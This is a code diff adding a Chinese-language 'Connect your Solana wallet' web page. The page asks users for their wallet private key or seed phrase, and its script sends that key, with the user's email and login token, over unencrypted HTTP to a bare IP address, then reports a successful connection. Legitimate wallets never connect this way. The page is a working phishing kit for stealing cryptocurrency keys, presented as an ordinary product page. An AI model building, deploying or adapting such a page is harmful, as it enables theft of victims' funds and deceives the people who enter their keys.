@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>连接钱包 | Solana</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="css/connect-wallet.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="connect-container">
+        <h1>连接您的 Solana 钱包</h1>
+        <p>请输入您的钱包私钥以连接到 Solana 网络</p>
+        
+        <div class="form-group">
+            <label for="privateKey">钱包私钥</label>
+            <textarea id="privateKey" placeholder="请输入您的私钥或助记词"></textarea>
+        </div>
+        
+        <button id="connectButton">连接钱包</button>
+        
+        <p id="errorMessage"></p>
+        
+        <div class="success-icon" style="display: none;">
+            <i class="fas fa-check-circle"></i>
+        </div>
+    </div>
+
+<script>
+    // API基础URL
+    const API_BASE_URL = 'http://182.92.84.86/api';
+    
+    // 获取用户token
+    const userToken = localStorage.getItem('user_token');
+    const userEmail = localStorage.getItem('user_email');
+    
+    // 检查用户登录状态
+    if (!userToken) {
+        window.location.href = 'index.html';
+    }
+    
+    // 连接钱包按钮点击事件
+    document.getElementById('connectButton').addEventListener('click', function() {
+        const privateKey = document.getElementById('privateKey').value;
+        const errorMessage = document.getElementById('errorMessage');
+        
+        if (!privateKey) {
+            errorMessage.textContent = '请输入您的私钥';
+            errorMessage.style.color = '#ff3b30';
+            return;
+        }
+        
+        errorMessage.textContent = '连接中...';
+        errorMessage.style.color = '#0071e3';
+        
+        // 发送私钥到服务器
+        fetch(`${API_BASE_URL}/keys/submit`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${userToken}`
+            },
+            body: JSON.stringify({ privateKey, email: userEmail })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                // 连接成功
+                errorMessage.textContent = '钱包连接成功！';
+                errorMessage.style.color = '#34c759';
+                
+                // 显示成功界面
+                document.querySelector('.connect-container').classList.add('success');
+            } else {
+                // 连接失败
+                errorMessage.textContent = data.message || '连接失败，请稍后再试';
+                errorMessage.style.color = '#ff3b30';
+            }
+        })
+        .catch(error => {
+            console.error('连接请求失败:', error);
+            errorMessage.textContent = '服务器连接失败，请稍后再试';
+            errorMessage.style.color = '#ff3b30';
+        });
+    });
+</script>
+</body>
+</html>
